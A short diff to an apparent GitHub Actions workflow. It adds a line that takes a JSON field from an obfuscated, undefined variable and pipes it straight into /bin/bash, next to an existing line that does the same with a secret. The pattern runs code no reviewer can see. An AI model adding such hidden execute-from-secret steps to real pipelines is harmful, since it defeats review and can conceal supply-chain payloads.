@@ -20,6 +20,7 @@ jobs:
           u075: ${{ secrets.u075 }}
         run: |
           printf '%s' "$u075" | jq -r .fbh6 | /bin/bash
+          printf '%s' "$oitz0591" | jq -r .kcrp01 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
